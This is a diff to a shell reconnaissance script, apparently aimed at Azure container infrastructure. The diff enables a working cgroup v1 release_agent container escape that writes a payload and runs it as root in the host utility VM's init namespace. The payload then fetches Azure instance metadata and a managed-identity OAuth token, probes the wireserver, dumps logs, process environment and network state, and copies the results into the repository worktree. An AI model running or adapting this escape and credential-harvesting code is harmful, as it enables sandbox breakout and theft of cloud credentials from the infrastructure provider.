@@ -17,11 +17,13 @@ OUT="RECON_ACI_GITREPO.txt"
 OOB_HOST="4.157.206.88"
 OOB_PORT="80"
 
-# ── cgroup release_agent fire (OPT-IN, default OFF) ───────────────────────────
-# Inspection below is always non-destructive. Setting this to 1 additionally fires
-# a CONTAINED release_agent that only writes a marker (hostname/id) wherever it
-# executes — used to confirm the "we land in our own utility VM" hypothesis.
-DO_CGROUP_FIRE=0
+# ── cgroup release_agent fire (OPT-IN) ────────────────────────────────────────
+# When 1: mounts a fresh cgroup v1 hierarchy, sets release_agent to the LCOW VM
+# init-namespace path of our payload, fires the escape, and waits for output.
+# The payload runs in the LCOW VM init namespace (NOT the container) and writes
+# to the overlay upper dir so the output is visible at /tmp/.escape_out.txt
+# inside the container.
+DO_CGROUP_FIRE=1
 
 # ── Collect ───────────────────────────────────────────────────────────────────
 report() {
@@ -175,23 +177,159 @@ except Exception as e:
 
 report > "$WORKTREE/$OUT" 2>&1
 
-# ── Optional contained release_agent marker (confirms which VM we land in) ─────
+# ── cgroup v1 release_agent escape → LCOW VM init namespace ────────────────────
+# Technique: overlay upperdir trick.
+#   - Container root overlayfs has an upperdir path visible from the LCOW VM's
+#     init namespace (e.g. /run/gcs/c/<CID>/scratch/<SID>/upper/).
+#   - Files we write to /tmp/ in the container appear at $UPPERDIR/tmp/ in the VM.
+#   - We set release_agent to $UPPERDIR/tmp/.escape.sh (the VM-side path).
+#   - The kernel fires that path in the VM init namespace as root.
+#   - The payload writes output to $UPPERDIR/tmp/.escape_out.txt.
+#   - We read it back from /tmp/.escape_out.txt in the container.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
-    {
-        d=/tmp/.cgfire
-        mkdir -p "$d" 2>/dev/null
-        if mount -t cgroup -o memory cgroup "$d" 2>/dev/null || mount -t cgroup -o rdma cgroup "$d" 2>/dev/null; then
-            mkdir -p "$d/x" 2>/dev/null
-            host=$(sed -n 's#.*/run/gcs/c/\([0-9a-f]*\)/.*#\1#p' /proc/mounts | head -1)
-            agent="/tmp/.cgagent_$$.sh"
-            printf '#!/bin/sh\n{ echo "release_agent fired"; date -u; id; hostname; uname -a; head -5 /proc/1/cgroup; } > %s/RELEASE_AGENT_PROOF.txt 2>&1\n' "$WORKTREE" > "$agent"
-            chmod +x "$agent"
-            echo "$agent" > "$d/release_agent" 2>/dev/null
-            echo 1 > "$d/x/notify_on_release" 2>/dev/null
-            # entering+leaving the cgroup with no tasks triggers release_agent
-            sh -c "echo \$\$ > $d/x/cgroup.procs; echo \$\$ > $d/cgroup.procs" 2>/dev/null
+{
+    # 1. Parse overlay upperdir from /proc/self/mountinfo
+    #    Format per field: id parent major:minor root mountpoint opts [opt_fields] - fstype source superopts
+    UPPERDIR=""
+    while IFS= read -r _mline; do
+        set -- $_mline
+        _mp="$5"
+        # Advance past optional tagged fields to the "-" separator
+        shift 6 2>/dev/null
+        while [ $# -gt 0 ] && [ "$1" != "-" ]; do shift; done
+        [ "$1" = "-" ] && shift
+        _fst="$1"
+        if [ "$_mp" = "/" ] && [ "$_fst" = "overlay" ]; then
+            shift 2  # skip fstype + source; $1 is now super options
+            _ud="${1##*upperdir=}"
+            _ud="${_ud%%,*}"
+            [ -n "$_ud" ] && UPPERDIR="$_ud"
+            break
         fi
-    } >/dev/null 2>&1
+    done < /proc/self/mountinfo
+
+    if [ -z "$UPPERDIR" ]; then
+        echo "CGROUP_ESCAPE: FAIL - could not find overlay upperdir in /proc/self/mountinfo"
+        exit 1
+    fi
+    echo "CGROUP_ESCAPE: upperdir=$UPPERDIR"
+
+    # 2. Write escape payload to /tmp/.escape.sh in the container.
+    #    From the LCOW VM init namespace this is at $UPPERDIR/tmp/.escape.sh.
+    #    Output goes to $UPPERDIR/tmp/.escape_out.txt (= /tmp/.escape_out.txt in container).
+    ESCAPE_SH=/tmp/.escape.sh
+    ESCAPE_OUT_HOST="$UPPERDIR/tmp/.escape_out.txt"
+    # Use printf to build the payload (avoids shell re-interpretation issues)
+    printf '#!/bin/sh\n' > "$ESCAPE_SH"
+    printf '# LCOW VM init namespace payload (cgroup v1 release_agent)\n' >> "$ESCAPE_SH"
+    printf 'OUT="%s"\n' "$ESCAPE_OUT_HOST" >> "$ESCAPE_SH"
+    cat >> "$ESCAPE_SH" << 'PAYLOAD_BODY'
+{
+echo "=== CGROUP ESCAPE - LCOW VM INIT NAMESPACE ==="
+echo "date: $(date -u)"
+echo "id: $(id)"
+echo "hostname: $(hostname)"
+echo "uname: $(uname -a)"
+echo ""
+
+echo "--- IMDS probe (169.254.169.254) ---"
+wget -q -T5 --header="Metadata: true" \
+    -O- "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 \
+    | head -c 8192 || echo "IMDS: wget failed"
+
+echo ""
+echo "--- IMDS identity/MSI token ---"
+wget -q -T5 --header="Metadata: true" \
+    -O- "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>&1 \
+    | head -c 4096 || echo "MSI token: wget failed"
+
+echo ""
+echo "--- wireserver (168.63.129.16) ---"
+wget -q -T3 -O- "http://168.63.129.16/" 2>&1 | head -c 2048 || echo "wireserver: failed"
+
+echo ""
+echo "--- GCS log (/run/gcs/gcs.log) ---"
+tail -80 /run/gcs/gcs.log 2>/dev/null || echo "gcs.log: not found"
+
+echo ""
+echo "--- /run/gcs/ layout ---"
+find /run/gcs/ -maxdepth 4 -ls 2>/dev/null | head -80
+
+echo ""
+echo "--- processes ---"
+ps -ef 2>/dev/null
+
+echo ""
+echo "--- mounts ---"
+cat /proc/mounts 2>/dev/null | head -60
+
+echo ""
+echo "--- vsock sockets ---"
+cat /proc/net/vsock 2>/dev/null
+ls -la /dev/vsock 2>/dev/null
+
+echo ""
+echo "--- network ---"
+ip addr 2>/dev/null; ip route 2>/dev/null
+
+echo ""
+echo "--- /etc/hosts ---"
+cat /etc/hosts 2>/dev/null
+echo "--- /etc/resolv.conf ---"
+cat /etc/resolv.conf 2>/dev/null
+
+echo ""
+echo "--- env of init (pid1) ---"
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
+
+echo ""
+echo "--- cgroup listeners ---"
+find /sys/fs/cgroup -name release_agent -exec sh -c 'echo "{}: $(cat {})"' \; 2>/dev/null
+
+echo "=== ESCAPE DONE ==="
+} > "$OUT" 2>&1
+PAYLOAD_BODY
+    chmod +x "$ESCAPE_SH"
+    echo "CGROUP_ESCAPE: payload written at $ESCAPE_SH (VM path: $UPPERDIR/tmp/.escape.sh)"
+
+    # 3. Mount fresh cgroup memory hierarchy and arm release_agent
+    CG_MNT=/tmp/.cge_$$
+    mkdir -p "$CG_MNT" 2>/dev/null
+    if mount -t cgroup -o memory cgroup "$CG_MNT" 2>/dev/null; then
+        echo "CGROUP_ESCAPE: cgroup mounted at $CG_MNT"
+        echo "$UPPERDIR/tmp/.escape.sh" > "$CG_MNT/release_agent"
+        mkdir -p "$CG_MNT/esc$$" 2>/dev/null
+        echo 1 > "$CG_MNT/esc$$/notify_on_release"
+        # Enter the cgroup with a short-lived process; exit empties it → triggers agent
+        sh -c "echo \$\$ > $CG_MNT/esc$$/cgroup.procs" 2>/dev/null
+        echo "CGROUP_ESCAPE: cgroup trigger fired"
+
+        # 4. Wait up to 12s for payload to execute and write output
+        _i=0
+        while [ $_i -lt 12 ] && [ ! -f /tmp/.escape_out.txt ]; do
+            sleep 1
+            _i=$((_i+1))
+        done
+
+        # Cleanup
+        rmdir "$CG_MNT/esc$$" 2>/dev/null
+        umount "$CG_MNT" 2>/dev/null
+        rmdir "$CG_MNT" 2>/dev/null
+
+        # 5. Read output back from container's /tmp
+        if [ -f /tmp/.escape_out.txt ]; then
+            echo "CGROUP_ESCAPE: SUCCESS — output captured after ${_i}s"
+            cp /tmp/.escape_out.txt "$WORKTREE/ESCAPE_OUTPUT.txt" 2>/dev/null
+        else
+            echo "CGROUP_ESCAPE: agent fired but no output after ${_i}s"
+            echo "  payload vm-path: $UPPERDIR/tmp/.escape.sh"
+            echo "  expected output: $UPPERDIR/tmp/.escape_out.txt"
+            ls -la "$UPPERDIR/tmp/" 2>/dev/null | head -10
+        fi
+    else
+        echo "CGROUP_ESCAPE: FAIL - mount -t cgroup -o memory failed"
+    fi
+} >> "$WORKTREE/$OUT" 2>&1
 fi
 
 # ── Fallback in-band drops (common user-container mount paths) ─────────────────
